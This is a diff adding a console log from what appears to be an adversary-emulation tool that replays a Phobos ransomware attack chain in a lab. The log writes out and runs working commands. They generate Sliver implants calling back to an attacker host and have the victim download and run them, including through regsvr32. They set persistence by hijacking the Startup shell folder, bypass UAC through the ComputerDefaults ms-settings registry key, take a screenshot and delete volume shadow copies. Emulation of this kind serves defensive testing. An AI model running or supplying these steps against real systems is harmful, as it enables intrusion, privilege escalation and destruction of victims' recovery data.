@@ -1,0 +1,329 @@
+└─$ python 4_PhobosRansomware_attack_chain.py 
+╭──────────────── Hello ────────────────╮
+│ 🎯 Welcome to Attack Execution Wizard │
+╰───────────── Let's Begin ─────────────╯
+
+📌[Sliver Console] Step 1
+
+📌[Name] Build DLL Sliver implant
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (default: None, required: True): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (default: None, required: True): 1234
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (default: None, required: True): sliver_save
+[MANUAL ACTION REQUIRED]
+    sliver > generate --mtls 192.168.56.101:1234 --os windows --arch 64bit --format shared --save sliver_save
+    sliver > mtls --lport 1234
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[Human] Step 2
+
+📌[Name] Simulate the victim download a file on its machine
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (default: None, required: True): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (default: 8000, required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (default: None, required: True): C:\Users\victim\Downloads\REASONABLE_GRASS.dll
+    (This step needs human interaction and (temporarily) cannot be executed automatically)
+    (On attacker's machine)
+    python -m http.server 8000
+
+    (On victim's machine)
+    1. Open 192.168.56.101:8000 in the browser
+    2. Navigate to the path of the file on the attacker's machine
+    3. Download the file to C:\Users\victim\Downloads\REASONABLE_GRASS.dll
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[Human] Step 3
+
+📌[Name] Simulate the victim execute a DLL file on its machine
+ Parameter Input
+  Parameter: DLL_PATH
+  Description: Saved path of the DLL file
+  ✓ Using stored value: C:\Users\victim\Downloads\REASONABLE_GRASS.dll
+    (This step needs human interaction and (temporarily) cannot be executed automatically)
+    (On victim's machine, use PowerShell or Command Prompt)
+    regsvr32 C:\Users\victim\Downloads\REASONABLE_GRASS.dll
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[None] Step 4
+
+📌[Name] Execute a Sliver Implant Payload
+
+📌[Sliver Executor] Step 5
+
+📌[Name] User Context Verification
+ Parameter Input
+  Parameter: Executor
+  Description: The session ID of the active Sliver connection.
+  Select from available Sliver sessions:
+Available Sessions:
+[0] c6f29beb-55b5-4f93-8bea-28245506041a - REASONABLE_GRASS@WIN10-basic-tar (windows)
+Select session number: 0
+
+[Sliver Executor] Executing: whoami
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772850403754321899
+[All timestamps] [1772850403754321899]
+Exec Stdout: "win10-basic-tar\victim\r\n"
+Pid: 10512
+
+
+📌[Sliver Executor] Step 6
+
+📌[Name] Environment Variable Retrieval
+ Parameter Input
+  Parameter: Executor
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: c6f29beb-55b5-4f93-8bea-28245506041a
+ Parameter Input
+  Parameter: name
+  Description: Environment variable name to query
+➤ Enter value for name (default: , required: True): USERNAME
+
+[Sliver Executor] Executing: get_env
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772850431920683840
+[All timestamps] [1772850403754321899, 1772850431920683840]
+Environment variable: Variables {
+  Key: "USERNAME"
+  Value: "victim"
+}
+
+
+📌[Sliver Console] Step 7
+
+📌[Name] Build the executable file of a Sliver implant (for Windows)
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (default: None, required: True): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (default: None, required: True): 2345
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (default: None, required: True): sliver_save
+[MANUAL ACTION REQUIRED]
+    sliver > generate --mtls 192.168.56.101:2345 --os windows --arch 64bit --format exe --save sliver_save
+    sliver > mtls --lport 2345
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[Human] Step 8
+
+📌[Name] Simulate the victim download a file on its machine
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (default: None, required: True): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (default: 8000, required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (default: None, required: True): C:\Users\victim\Downloads\PERFECT_AGLET.exe
+    (This step needs human interaction and (temporarily) cannot be executed automatically)
+    (On attacker's machine)
+    python -m http.server 8000
+
+    (On victim's machine)
+    1. Open 192.168.56.101:8000 in the browser
+    2. Navigate to the path of the file on the attacker's machine
+    3. Download the file to C:\Users\victim\Downloads\PERFECT_AGLET.exe
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[Sliver Executor] Step 9
+
+📌[Name] Execute PowerShell Command
+ Parameter Input
+  Parameter: ParentExecutorID
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: c6f29beb-55b5-4f93-8bea-28245506041a
+
+📌[Powershell Executor] Step 10
+
+📌[Name] Change Startup Folder - HKCU Modify User Shell Folders Startup Value
+ Parameter Input
+  Parameter: Executor
+  Description: The executor for this action
+  ✓ Using stored value: c6f29beb-55b5-4f93-8bea-28245506041a
+ Parameter Input
+  Parameter: new_startup_folder
+  Description: new startup folder to replace standard one
+➤ Enter value for new_startup_folder (default: $env:T$env:APPDATA\Microsoft\Windows\Update\
+ Parameter Input
+  Parameter: payload
+  Description: executable to be placed in new startup location 
+  ✓ Using stored value: C:\Users\victim\Downloads\PERFECT_AGLET.exe
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772850619603882400
+[All timestamps] [1772850403754321899, 1772850431920683840, 1772850619603882400]
+Executing: New-Item -ItemType Directory -path "$env:APPDATA\Microsoft\Windows\Update\"
+Output:
+Stdout: "\r\n\r\n    ??: C:\Users\victim\AppData\Roaming\Microsoft\Windows\r\n\r\n\r\nMode                 LastWriteTime         Length Name                                                                 \r\n----                 -------------         ------ ----                                                                 \r\nd-----          3/6/2026   8:30 PM                Update                                                               \r\n\r\n\r\n"
+Pid: 11876
+
+
+Executing: Copy-Item -path "C:\Users\victim\Downloads\PERFECT_AGLET.exe" -destination "$env:APPDATA\Microsoft\Windows\Update\"
+Output:
+Pid: 11396
+
+
+Executing: Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "$env:APPDATA\Microsoft\Windows\Update\"
+Output:
+Pid: 12600
+
+
+[FINISHED] Command completed!😊
+
+📌[None] Step 11
+
+📌[Name] Obtain a persistent Sliver Executor
+
+📌[Powershell Executor] Step 12
+
+📌[Name] Bypass UAC using ComputerDefaults (PowerShell)
+ Parameter Input
+  Parameter: Executor
+  Description: The executor for this action
+  ✓ Using stored value: c6f29beb-55b5-4f93-8bea-28245506041a
+ Parameter Input
+  Parameter: executable_binary
+  Description: Binary to execute with UAC Bypass
+  ✓ Using stored value: C:\Users\victim\Downloads\PERFECT_AGLET.exe
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772850635069036584
+[All timestamps] [1772850403754321899, 1772850431920683840, 1772850619603882400, 
+1772850635069036584]
+Executing: New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+Output:
+Stdout: "\r\n\r\n    Hive: HKEY_CURRENT_USER\software\classes\ms-settings\shell\open\r\n\r\n\r\nName                           Property                                                                                \r\n----                           --------                                                                                \r\ncommand                                                                                                                \r\n\r\n\r\n"
+Pid: 8396
+
+
+Executing: New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+Output:
+Stdout: "\r\n\r\nDelegateExecute : \r\nPSPath          : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\software\classes\ms-settings\shell\open\command\r\nPSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\software\classes\ms-settings\shell\open\r\nPSChildName     : command\r\nPSDrive         : HKCU\r\nPSProvider      : Microsoft.PowerShell.Core\Registry\r\n\r\n\r\n\r\n"
+Pid: 13172
+
+
+Executing: Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Users\victim\Downloads\PERFECT_AGLET.exe" -Force
+Output:
+Pid: 5852
+
+
+Executing: Start-Process "C:\Windows\System32\ComputerDefaults.exe"
+Output:
+Pid: 8392
+
+
+[FINISHED] Command completed!😊
+
+📌[Human] Step 13
+
+📌[Name] Simulate the victim download and execute malicious payload file
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (default: None, required: False): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (default: 8000, required: False): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (default: None, required: True): C:\Users\victim\Downloads\PERFECT_AGLET.exe
+    (This step needs human interaction and (temporarily) cannot be executed 
+automatically)
+    (On attacker's machine)
+    python -m http.server 8000
+
+    (On victim's machine)
+    1. Open 192.168.56.101:8000 in the browser
+    2. Navigate to the path of the target payload file
+    3. Download the payload file
+    4. Execute the payload file to C:\Users\victim\Downloads\PERFECT_AGLET.exe (If on a 
+Linux machine, you also need to chmod the file)
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[None] Step 14
+
+📌[Name] Execute a Sliver Implant Payload
+
+📌[Sliver Executor] Step 15
+
+📌[Name] Take Screenshot
+ Parameter Input
+  Parameter: Executor
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: c6f29beb-55b5-4f93-8bea-28245506041a
+
+[Sliver Executor] Executing: screenshot
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772850683321820285
+[All timestamps] [1772850403754321899, 1772850431920683840, 1772850619603882400, 
+1772850635069036584, 1772850683321820285]
+Screenshot saved to /home/kali/Downloads/screenshot_20260306202639.png
+
+📌[Sliver Executor] Step 16
+
+📌[Name] Execute Command (cmd.exe)
+ Parameter Input
+  Parameter: ParentExecutorID
+  Description: The session ID of the active Sliver connection.
+  Select parent session for derived executor:
+Available Sessions:
+[0] c6f29beb-55b5-4f93-8bea-28245506041a - REASONABLE_GRASS@WIN10-basic-tar (windows)
+[1] f4f9a21b-e72e-4525-b0b9-2058cd8b704f - PERFECT_AGLET@WIN10-basic-tar (windows)
+[2] b878f7b2-ec8b-41e4-8166-050719646cf5 - PERFECT_AGLET@WIN10-basic-tar (windows)
+Select session number: 2
+
+📌[Elevated Command Prompt Executor] Step 17
+
+📌[Name] Windows - Delete Volume Shadow Copies via WMI
+ Parameter Input
+  Parameter: Executor
+  Description: The executor for this action
+  ✓ Using stored value: b878f7b2-ec8b-41e4-8166-050719646cf5
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772850694600298159
+[All timestamps] [1772850403754321899, 1772850431920683840, 1772850619603882400, 
+1772850635069036584, 1772850683321820285, 1772850694600298159]
+Executing: wmic.exe shadowcopy delete
+Output:
+Stdout: "No Instance(s) Available.\r\r\n"
+Pid: 10288
+
+
+[FINISHED] Command completed!😊
